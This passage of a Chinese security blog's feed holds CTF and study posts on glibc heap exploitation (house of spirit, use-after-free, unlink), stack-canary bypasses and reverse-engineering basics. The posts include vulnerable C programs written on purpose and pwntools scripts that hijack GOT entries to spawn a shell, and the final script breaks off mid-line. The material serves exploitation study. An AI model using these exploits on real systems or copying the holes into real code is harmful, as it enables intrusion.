            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位 house of spirit</title>
      <link href="/2019/08/03/64-wei-house-of-spirit/"/>
      <url>/2019/08/03/64-wei-house-of-spirit/</url>
      
        <content type="html"><![CDATA[<p>这个题目有问题，但是重要的是利用思想：可以把源码贴出来帮助理解：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;char buf[128];  /*值得注意的是这几个全局变量在bss段是紧挨着排列的*/char *ptr[8];char *cmd;    //fake_chunk要把这个包含进去，这样的话就可以利用fgets实现任意地址写入int size;int n = 0;void sh(char *c){    system(c);}int main(){    setvbuf(stdout,0,_IONBF,0);    memset(ptr,0,sizeof(ptr));    cmd = buf;    while(1)    {        fgets(cmd,sizeof(buf),stdin);        if(!strncmp(cmd,&quot;push&quot;,4))   //strncmp意思是只比较前4个        {            if(n&lt;8)            {                scanf(&quot;%d%*c&quot;,&amp;size);   //这里可以写入size 进而伪造next_chunk_size                ptr[n] = malloc(size);                fgets(ptr[n],size,stdin);                n++;            }            else            {                puts(&quot;stack is full&quot;);            }        }            else if(!strncmp(cmd,&quot;pop&quot;,3))            {                if(n&gt;=0)                {                    n--;                    puts(ptr[n]);                    free(ptr[n]);                    ptr[n] = 0;                }                else                {                    puts(&quot;stack is empty&quot;);                }            }            else{                puts(&quot;unkonwn command&quot;);            }        }    }</code></pre><p>file得知是64位动态链接程序，那么看看ida分析   （push指针共有8个，图里面写错了）<br><img src="/2019/08/03/64-wei-house-of-spirit/1.png" title="This is an image"><br>那么我们的第一步就是伪造chunk ，这一点需要注意的就是地址要16位对齐，否则free的时候无法绕过检查，我们可以把size写入为next_chunk_size来躲过检查，然后把伪造的chunk free掉，然后就是malloc写入把cmd给溢出指向fgets@got，然后fgets把strncmp@got给覆盖了（因为下一个执行的就是strncmp,然后fgets@got的最后2个byte地方可以放参数/bin/sh,其它的可以用00填充 ），下次调用就直接getshell</p>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stack cookie探索</title>
      <link href="/2019/08/03/stack-cookie-tan-suo/"/>
      <url>/2019/08/03/stack-cookie-tan-suo/</url>
      
        <content type="html"><![CDATA[<p>stack cookie的两种讲法</p><ul><li>windows平台上叫 /GS:cookie</li><li>linux上叫Stack Canary</li></ul><p>它的原理就是在ebp-4的地方插入一个随机数（4字节还是8字节看计算机位数了），然后在函数返回（return）的时候会调用另一个函数去检查这个值是否被修改，如果被修改了的话就终止程序，这就使得经典栈溢出的手法难以奏效</p><ul><li>首先在windows平台上，在vs编译的时候有那个安全选项可以加上，然后在调试的时候就直接看函数，我们会发现在以前的经典的push ebp   mov ebp esp , sub esp , 88h这些之后呢，还会有一个mov eax , dword prt [stack_overflow_gs!_security_cookie(00416000)]            xor eax,ebp 这样类似的东西，这个其实就是添加一个随机数进去，然后在程序的结束部分还有一个对应的操作 mov ecx,doword prt [ebp-4]   xor ecx,ebp  call stack_overflow_gs!ILT_25(_security_check_cookie)(00416000)这类操作（具体代码可能不一样但是都是这个意思）</li><li>下面详细说一下：</li><li><p>调试可以发现那个cookie的初始值0041600其实就是.data段的起始地方，在程序运行得时候这里面是个随机数字，但是你在原始文件的PE里面可以看，.data段的值不是全部一样的，为啥呢？其实是在start函数后的有一个_mainCRTStartup的一个库启动的时候有一个函数调用__security_init_cookie 下面是ida里面的情况</p><img src="/2019/08/03/stack-cookie-tan-suo/1.png" title="This is an image"><p>我们可以看出cookie的值有一套自己的计算逻辑，基本上是以系统时间，进程id,性能计数器等作为可变元</p></li><li><p>stack_overflow_gs!ILT_25(_security_check_cookie)这个函数做了什么？  其实里面就是一个cmp 的比较不相等的话跳到函数里面的另一个函数里（这个函数就是终止程序啦，反馈信息了，这么一些个操作），OK   windows上差不多就这些。</p></li></ul><p>下面这个讲linux上的cookie，这个是当前时期的重点：</p><ul><li><p>首先它跟windows第一点的不同就是代码顺序</p><img src="/2019/08/03/stack-cookie-tan-suo/2.png" title="This is an image"></li><li><p>它这个其实是在栈开辟完成后进行的一盘操作而且我们也看到了，这个canary的位置是在ebp - 0xc的位置，然后要知道的一点就是cookie的初始化是在glibc里面进行的，但是不要认为cookie是glibc生成的，其实是内核给的glibc</p></li><li>然后还是最后有个检查嘛</li><li><img src="/2019/08/03/stack-cookie-tan-suo/3.png" title="This is an image"></li></ul><p>下面最最重要的当然是破解手法了：</p><ol><li>其一肯定是暴力破解cookie值，但是这个应用场景有限，你要是没啥前提条件单纯的跑程序的话，cookie的值每次都会变，估计你就呵呵呵了，那么，这个前提条件就是子进程存在栈溢出漏洞（linux上子进程跟父进程之间关系严格）这个意思就是子进程无限的fork，因为在这个时候它的哪个cookie事实上是继承的父进程的cookie，那么父进程fork的时候给子进程的cookie都是哪一个，那么你就暴力破解吧。</li><li>leak info(OOB read，file log)  意思就是程序还存在其他漏洞，想越界读取啊 ， 格式化字符串啊， 其他的一些输出函数啊 ，那么我们调整一些参数，利用这些漏洞可以得到Cookie的值啊。</li><li>迂回绕过，这意思就是我们可以避开cookie的检查（例如我们可以不修改你的ebp , ret_addr，我们就简单的修改你的局部变量来改变程序流程）</li><li>这个就是我们既然得不到cookie, 那么意思就是__stack_chk_fial@plt这个函数非要执行不可了，那我们可以把这个函数给got劫持了，把它里面.got.plt那个地址改成我们shellcode的地址。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap House of Spirit</title>
      <link href="/2019/08/03/glibc-heap-house-of-spirit/"/>
      <url>/2019/08/03/glibc-heap-house-of-spirit/</url>
      
        <content type="html"><![CDATA[<p>这个技术也是针对于fastbin，属于fastbin_attack的一种。<br>关键：目标位置伪造fastbin chunk并将其释放，进而实现在指定地址分配chunk</p><p>关于free时候的检查：</p><ul><li>free检查会看size的低字节flag的IS_MMAP标志位，M标志位没有被置1才会绕过检查，否则就会调用munmap_chunk函数去释放堆块</li></ul><p>1.free的chunk的size不可以太离谱，不要太大太小，并且chunk要对齐</p><pre><code>       if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)               || __builtin_expect(misaligned_chunk(p), 0))               malloc_printerr(&quot;free(): invalid pointer&quot;);        /* We know that each chunk is at least MINSIZE bytes in size or a           multiple of MALLOC_ALIGNMENT.  */        if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))               malloc_printerr(&quot;free(): invalid size&quot;);</code></pre><p>2.free的时候也会检查当前Chunk的下一个chunk，也是不能太小不能太大（大于2*SIZE_SZ小于system_mem）其中SIZE_SZ在32位上是4，64位上是8</p><pre><code>if (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size))                       &lt;= 2 * SIZE_SZ, 0)                       || __builtin_expect(chunksize(chunk_at_offset(p, size))                              &gt;= av-&gt;system_mem, 0))</code></pre><p>检查绕过：</p><ul><li>fake chunk 的ISMMAP位不能是1 ，因为free的时候如果 是mmap的话 会被单独 处理</li><li>fake chunk 的地址需要对齐</li><li>fake chunk的size大小满足fastbin，并且对齐</li><li>fake chunk的size大小不能小于2*SIZE_SZ（4或者8），同时不能大于av-&gt;system_mem。</li><li>fake chunk对应的fastbin链表头部不能是该fake chunk，即是不能构成double free的情形</li></ul><p>利用条件：</p><ol><li>想要控制的区域的前段空间和后端空间都是内存可控的<br> 1.我们想要控制的目标内存一般是返回地址或者函数指针 ，这个应该属于.text段，所以一般情况下这段内存是我们的输入无法控制的，就是我们控制不了的意思。</li></ol><p>2.存在可将堆变量指针覆盖指向为可控区域，即上一步中的区域</p><p>how2heap里面的相关源码我们可以看一下：</p><pre><code>配出来的时候，就有可能改写我们目标区域。还是像以前一样，先上一段代码给大家一个直观印象再具体解释，这段代码是shellfish的github里面的源码。  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  int main()  {         printf(&quot;This file demonstrates the house of spirit attack.n&quot;);         printf(&quot;Calling malloc() once so that it sets up its memory.n&quot;);         malloc(1);        printf(&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.n&quot;);        unsigned long long *a;        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));        printf(&quot;This region must contain two chunks. The first starts at %p and the second at %p.n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[7]);        printf(&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n&quot;);        printf(&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n&quot;);        fake_chunks[1] = 0x40; // this is the size        printf(&quot;The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av-&gt;system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .n&quot;);        fake_chunks[9] = 0x2240; // nextsize        printf(&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n&quot;, &amp;fake_chunks[1]);        printf(&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n&quot;);        a = &amp;fake_chunks[2];        printf(&quot;Freeing the overwritten pointer.n&quot;);        free(a);        printf(&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);        printf(&quot;malloc(0x30): %pn&quot;, malloc(0x30));}</code></pre><p>解析和思路：</p><ol><li>伪造堆块：在可控区域输入数据进而把它伪造成为一个fastbin</li><li>覆盖堆指针指向上一步伪造的堆块</li><li>释放堆块，讲伪造的堆块释放到fastbin单链表里面</li><li>申请堆块，讲刚释放的堆块申请出来，最终使得可以向目标内存里面写入数据</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程小知识</title>
      <link href="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/"/>
      <url>/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>在VB中：<br><strong>vbaVarForInit() , </strong>vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环</p><pre><code>MSVBVM50.rtcMsgBox  \\调用消息框</code></pre><p>入口点：<br>    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令<br><img src="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/1.png" title="This is an image"><br>EP:<br>    EP是windows可执行文件（EXE,DLL,SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU</p><p>查找main函数的方法：<br>    简单有效：F7,F8查看函数 （一些经验就是可以通过注释区的注释直接步过一些函数列如一些winAPI）</p><p>大本营：<br>    为了重复加载程序方便，我们可以在一些地方下断点防止一些麻烦（就比如不用一次次的找main函数）</p><ol><li>GOTO 命令（Ctrl+G）然后 F4</li><li>设置断点</li><li>加上注释（快捷键 ; ）</li><li>加上标签 （快捷键 : ）</li></ol><p>快速查找指定代码的四种方法：    </p><ol><li>代码执行法</li><li>字符串检索法</li><li>API检索法（1）：程序没有压缩器/保护器的保护  用All intermodular calls 生成API函数列表</li><li>API检索法（2）：存在（1）中情况   此时DLL代码库被加载到内存后，我们可以直接向DLL库中添加断点 （快捷键Alt + M 打开内存映射窗口可以查看一些进程内存和USER32库的加载情况），同时 Name in all modules可以列出所被加载的DLL文件中提供的API</li></ol><p>函数调用约定：<br>  cdecl:<br>    调用者直接清理其压入栈的函数参数<br>   stdcall:<br>    一个使用例子</p><pre><code>#include &quot;stdio.h&quot;int _stdcall add(int a ,int b){    return a+b;}int main(){    return add(1,2);}</code></pre><p>  这种方式是用被调用函数自己清理栈，其汇编结尾 一般用 RETN+一个数字（栈大小）<br>  fastcall:<br>  与stdcall方式基本相似，但是该方式通过使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前两个）一般为ECX,EDX</p><ul><li>逆向工程中函数调用的返回值一般保存在eax中，在程序call指令之后一般就会有对eax寄存器的处理，这一点可以用来判断函数的用途和结构</li><li><p>.逆向工程中确定函数参数多少的方法：</p><pre><code>进入函数后可以看到它栈空间中存储的返回地址，通过该返回地址你可以找到调用该函数的起始地址，然后可以分析在进入函数体前后的栈空间大小来确定参数多少</code></pre></li><li><p>一些逆向可能会直接在程序内部存在注册码，可以通过找到注册码错误的字符串确定比较注册码正确与否的函数，而在改函数的附近一般会存在正确的注册码。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap UAF</title>
      <link href="/2019/08/02/glibc-heap-uaf/"/>
      <url>/2019/08/02/glibc-heap-uaf/</url>
      
        <content type="html"><![CDATA[<p>use after free（UAF）</p><ul><li>重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空指针）</li><li>还有一个小点就是要注意在64bits的时候有可能会出现高位的\x00截断这种事情</li><li>这个关键的一点就是free掉的内存块，还是可以再次拿出来用的，就想之前free的chunk，malloc的也可以再次拿出来，我们看一个例子</li></ul><pre><code>#include&lt;stdio.h&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;class A{    public:        virtual void print()        {            puts(&quot;class A&quot;);        }};class B:public A{    public:        void print(){            puts(&quot;class B&quot;);        }};void sh(){    system(&quot;sh&quot;);}char buf[1024];int main(){    setvbuf(stdout,0,_IONBF,0);   \\这个setvbuf是C库函数，作用跟参数有关，可以百度一下，目前的作用是    A *p = new B();    delete p;    fgets(buf,sizeof(buf),stdin);    char *q = strdup(buf);   \\这个其实就是有一个malloc分配内存块然后把字符串打印进去    p-&gt;print();}</code></pre><p>然后就要分析一下这个源码，首先看一下strdup的源码，这个函数定义在string.h这个头文件之中，</p><pre><code>char * __strdup(const char *s){   size_t  len = strlen(s) +1;   void *new = malloc(len);   if (new == NULL)      return NULL;   return (char *)memecpy(new,s,len);}</code></pre><p>那么我们开始走程序，我们在delete p下断点执行程序，然后看ida先分析一下，<br><img src="/2019/08/02/glibc-heap-uaf/1.png" title="This is an image"><br>我们可以看到申请了是8bit的内存空间，但是对齐到最后应该会生成一个32位大小的堆块，进GDB<br><img src="/2019/08/02/glibc-heap-uaf/2.png" title="This is an image"><br>我们看到分配的mem在rax里面，而且目前mem刚申请出来，还都是0，其实也可以看到，下面有一个清0的操作，下面来个图带解释<br><img src="/2019/08/02/glibc-heap-uaf/3.png" title="This is an image"><br>call B之后内存块是这样的<br><img src="/2019/08/02/glibc-heap-uaf/4.png" title="This is an image"><br>然后紧接着的delete就给全清0了<br><img src="/2019/08/02/glibc-heap-uaf/5.png" title="This is an image"><br>然后紧接着fgets 输入8个a ，输入到了0x601160这个bss段，然后就指向strdup函数，然后把bss段的东西读入到新申请的mem<br><img src="/2019/08/02/glibc-heap-uaf/6.png" title="This is an image"><br>这时候我们惊喜的发现我们之前的chunk被拿出来用了，被填上了我们的输入，那么因为之前那个指针p没有被置为NULL,所以它还是指向这里的，我们可以利用此来劫持函数流，因为源代码的下面,还可以看看ida里面，有一个p的调用：<br><img src="/2019/08/02/glibc-heap-uaf/7.png" title="This is an image"><br>接下来利用过程就很关键了：<br><img src="/2019/08/02/glibc-heap-uaf/8.png" title="This is an image"><br>我们就可以开做题了：</p><pre><code>#coding:utf-8from pwn import *r = process(&#39;./use-after-free&#39;)buf = 0x601160system_sh = 0x000000000400906r.sendline(p64(buf+8)+p64(system_sh))     #这个送过去的数据不能太大，太大的话就不会申请的原来的chunk,如果想要刚刚好的话是24byte,不过这个不用刚刚好，因为chunk补齐，chunk的最小刚好是32byte,+8是因为对输入的地址要进行解引用的，可以看细看解析的最后一部分r.interactive()</code></pre><p>下面这个是个32位的例子，来自安全客，看题目源码：</p><pre><code>#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);   //定义了一个函数指针，参数类型char *,没有返回值void evil_fuc(char command[]){    system(command);}void echo(char content[]){    printf(&quot;%s&quot;,content);}int main(){    func_ptr *p1=(int*)malloc(4*sizeof(int));    printf(&quot;malloc addr: %pn&quot;,p1);    p1[3]=echo;   //这个代表的是分配出来的内存块的第四个    p1[3](&quot;hello worldn&quot;);    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针    p1[3](&quot;hello againn&quot;); //p1指针未被置空,虽然free了,但仍可使用.    func_ptr *p2=(int*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.    printf(&quot;malloc addr: %pn&quot;,p2);    printf(&quot;malloc addr: %pn&quot;,p1);//p2与p1指针指向的内存为同一地址    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.    p1[3](&quot;whoami&quot;);   //p1这个指针跟先前的操作一样，本来是要传个参数给echo，但是因为被p2改成evil_fuc,参数就给了evil,当然这里换成p2也可以的    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap unlink漏洞</title>
      <link href="/2019/08/02/glibc-heap-unlink-lou-dong/"/>
      <url>/2019/08/02/glibc-heap-unlink-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>知识点：</p><ol><li>free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作</li><li>空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）</li><li>unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需要把前面或者后面的堆块从双向链表中摘取下来，合成更大的堆块插入到别的bin之中，将空闲堆块从bin里面摘取下来的操作就是unlink</li><li>chunk中的flag标志位 ： flag来源 ，size字节需要8字节对齐，就会空余出来3个bit, 其中最低位表示前一个chunk是否在使用，倒数第二位表示这个chunk是否通过mmap的方式产生，第三个表示 该chunk是否属于一个线程的arena</li><li>fd : 指向下一个空闲的chunk，bk指向上一个空闲的chunk</li><li>下面是一个往前合并的源码 ：值得注意的就是free在unlink的时候是先进行backward 然后 forward<pre><code>             /* consolidate backward 往前合并*/            if (!prev_inuse(p)) {     //先检查要free chunk的上一个chunk是不是 in_use，不是的话就往下操作                    prevsize = prev_size(p);   //取p的前一个chunk的size（利用的是p chunk的prev_size）                    size += prevsize;    //free_chunk的size + 上一个chunk的size                    p = chunk_at_offset(p, -((long)prevsize));  //p指向上一个chunk的开始处                     if (__glibc_unlikely(chunksize(p) != prevsize))   //然后这个应该是检查prev_size对不对，利用的是前后改变的chunk的size大小跟prev_size是不是相等                           malloc_printerr(&quot;corrupted size vs. prev_size while  consolidating&quot;);                    unlink(av, p, bck, fwd);   //这个就是我们要利用的地方了，下面有详解            }</code></pre></li><li>同时我截取_int_free的一段源码进行解析：<pre><code>_int_free(mstate av, mchunkptr p, int have_lock)  //这是它的参数 av是指向main_arena , p是指向要free的chunk{if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)   //这个是检查pointer是否合法if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))  //这个检查chunk的size是否合法if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast())  //还要检查是否属于fastbin 因为fastbin free的时候有自己的方式else if (!chunk_is_mmapped(p))  //上面那个检查通过后直接跳到这里，检查是否是mmap出来的chunk}</code></pre>8.最重要的就是合并时候的操作： 看6.<br>9.然后就是unlink了：<pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分/*malloc.c  int_free函数中*//* consolidate backward */if (!prev_inuse(p)) {  prevsize = p-&gt;prev_size;size += prevsize;  p = chunk_at_offset(p, -((long) prevsize));  unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来BK = P-&gt;bk;                                   \FD-&gt;bk = BK;                                  \BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）...     //后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre>10.我们说一下如何利用：</li></ol><ul><li>如果有heap overflow可以覆盖到某一个chunk q 的prev_size. 那么free q 时传入unlink（p）的 p 就可以控制</li><li>使得chunk p的内容可以被控制</li><li>FD = P -&gt; fd ; BK = P -&gt; bk ;  我们可以使得 PK = P -&gt; fd = <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18 （这就是的PK的bk处被写成了<a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a>） , BK = P -&gt; bk = shellcode ,那么free @got.plt就会被写入成为shellcode</li><li>但是，BK-&gt;fd = FD 那么你之前写入的shellcode的第16个bit开始会被改成 <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18  ，针对这个其实我们就可以开头插入一个jmp去跳过它</li></ul><p>一个实验用的（这里是32位的，大致跟64位利用相同）</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main( int argc, char * argv[] ){        char * first, * second;/*[1]*/ first = malloc( 666 );/*[2]*/ second = malloc( 12 );        if(argc!=1)/*[3]*/         strcpy( first, argv[1] );/*[4]*/ free( first );/*[5]*/ free( second );/*[6]*/ return( 0 );}</code></pre><p>在所有的malloc执行完之后：<br><img src="/2019/08/02/glibc-heap-unlink-lou-dong/1.png" title="This is an image"><br>unlink源码分析：</p><p>先后合并（把当前chunk的前一个chunk和当前chunk合并）</p><pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分    /*malloc.c  int_free函数中*//* consolidate backward */    if (!prev_inuse(p)) {      prevsize = p-&gt;prev_size;size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \    FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来    BK = P-&gt;bk;                                       FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）    ...     //后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre><p>malloc第一个chunk的prev_inuse标志一直都是1 虽然它事实上不存在<br>向前合并（forward） ：<br>检查next chunk是否处于free状态，我们回去检查next next chunk的prev_inuse标志位是否为1，下面是源码：</p><pre><code>#!c……/*这里p指向当前chunk*/nextchunk = chunk_at_offset(p, size);……nextsize = chunksize(nextchunk);……if (nextchunk != av-&gt;top) {      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//判断nextchunk是否为free chunk      /* consolidate forward */      if (!nextinuse) { //next chunk为free chunk            unlink(nextchunk, bck, fwd); //将nextchunk从链表中移除          size += nextsize; // p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！      } else            clear_inuse_bit_at_offset(nextchunk, 0);          ……    }</code></pre><p>在这个例子中next next chunk 就是top chunk，那么top chunk 的prev_inuse始终为1 ，所以也不会进行向前合并，但是我们可以利用堆溢出伪造，不过，我们还要了解一下合并后或者不满足条件没合并的chunk会怎么办：glibc malloc中会把他们放到unsorted bin之中</p><pre><code>#!c/*Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.*/  bck = unsorted_chunks(av); //获取unsorted bin的第一个chunk/*  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */    #define unsorted_chunks(M)          (bin_at (M, 1))*/      fwd = bck-&gt;fd;      ……      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))        {          p-&gt;fd_nextsize = NULL;          p-&gt;bk_nextsize = NULL;        }      bck-&gt;fd = p;      fwd-&gt;bk = p;        set_head(p, size | PREV_INUSE);//设置当前chunk的size,并将前一个chunk标记为已使用set_foot(p, size);//将后一个chunk的prev_size设置为当前chunk的size/*   /* Set size/use field */   #define set_head(p, s)       ((p)-&gt;size = (s))   /* Set size at footer (only when chunk is not in use) */   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))*/</code></pre><p>上面基本就是说，free后的chunk插入到unsorted chunk的第一个chunk(这个其实是bin)与下一个chunk（这个才是真正可用的第一个chunk）的中间当做表头，然后通过设置自己的size字段来表示前一个chunk可用，然后更改next chunk的prev_size为改chunk的大小，<br>但是本例中的chunk second没被放入unsort bin，而是放入了fastbin.<br>下面我们可以精心布置chunk second来实现攻击：<br>1.我们要修改chunk second 的chunk header</p><ul><li>任意数</li><li>size = -4  -4 = 11111100  //这个主要是控制prev_inuse 位</li><li>fd = free函数的got表地址-12</li><li>bk = shellcode的地址</li></ul><p>这样程序在继续运行得话如果free(first) , 我们要考虑是否合并，首先肯定不会向后合并，那就考虑向后合并，glibc通过chunk second 的size + chunk second 的prev_size 来确定next next chunk，那么现在size是-4，那么现在next_chunk，被当做next next chunk，因为size = -4所以next_chunk被当做free的，然后出发unlink，进行合并操作，</p><pre><code>BK=second-&gt;bk（在例子中bk实际上是shellcode的地址）FD=second-&gt;fd (在例子中fd实际上是free@got的地址 - 12)FD-&gt;bk=BK/*shellcode被写进了FD+12的位置，但是FD是free@got的地址-12，所以实际上我们已经把shellcode地址写入了free@got*/BK-&gt;fd=FD</code></pre><p>可是新的glibc增加了保护机制防止unlink,但是仍然可以绕过，下面同用于64和32位,但是例子是64位的：<br>检查源码：</p><pre><code>#define unlink(P, BK, FD) {                                                FD = P-&gt;fd;                             BK = P-&gt;bk;       if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))       //具体就是说在进行unlink操作之前，会先检查当前chunk的prev_chunk的fd和next_chunk的bk是不是当前chunk。            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);                                      FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                   ...     }</code></pre><p>overwrite Heap Pointer 利用条件:</p><ul><li>有一个指针指向heap</li><li>存放改指针的地址已知（比如改指针是全局变量）</li><li>可以对改指针多次写入 </li></ul><p>那么我们就可以构造下面来越过检查：</p><ul><li>p -&gt; fd = &amp;p - 0x18</li><li>p -&gt; bk = &amp;p - 0x10</li><li>接着源码继续进行 ， FD -&gt; bk = BK ; BK - &gt; fd = FD; </li><li>上述完成后我们得到的结果是 ： p = &amp;p - 0x18 </li></ul><p>引入一个例题（这个例题可以用来解释，但是实际操作的时候呢，程序会因为stdout,stdin，生成chunk 夹在中间，使得程序利用难以实现），不过重要的是思路：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;char *cmd;void sh(char *c){    system(c);}int main(){    char *ptr[8];    int size;    int n;    setvbuf(stdout,0,_IONBF,0);    memset(ptr,0,sizeof(ptr));    cmd = malloc(128);    //这里有一个地址已知的全局变量指针，还指向了heap , 而且下面的fgets可以实现对改指针的多次写入    while(1)    {        fgets(cmd,128,stdin);        if(!strncmp(cmd,&quot;add&quot;,3))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8)            {                printf(&quot;Size: &quot;);                scanf(&quot;%d%*c&quot;,&amp;size);                ptr[n] = malloc(size);                printf(&quot;Data: &quot;);                gets(ptr[n]);            }            else            {                puts(&quot;out of bound&quot;);            }        }        else if(!strncmp(cmd,&quot;renove&quot;,6))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d%*c&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8 &amp;&amp; ptr[n])            {                puts(ptr[n]);                free(ptr[n]);                ptr[n] = 0;            }            else            {                puts(&quot;nothing here&quot;);            }        }        else        {            puts(&quot;unkonw command&quot;);        }    }    return 0;}</code></pre><p>下面我们先给出脚本来方便分析</p><pre><code>#coding:utf-8from pwn import *context.log_level = &quot;debug&quot;r = remote(&#39;0.0.0.0&#39;,4000)#r = process(&#39;./unlink2&#39;)elf = ELF(&#39;unlink3&#39;)malloc_got = elf.got[&#39;malloc&#39;]sh_addr = 0x0000000004008A9def malloc(idx,size,data):    r.sendline(&#39;add&#39; + &#39;0&#39;*5 + p64(0x100) + p64(0x0000000006010B0-0x18)+p64(0x0000000006010B0-0x10))    3这里就在于构造FD的fd 和 bk 用于躲过检查    r.sendline(str(idx))    r.sendline(str(size))    r.sendline(str(data))def free(idx):    r.sendline(&#39;renove&#39;)    r.sendline(str(idx))malloc(0,130,&#39;aaaaaaaa&#39;)malloc(1,130,&#39;bbbbbbbb&#39;)free(0)malloc(2,130, 0x80 * 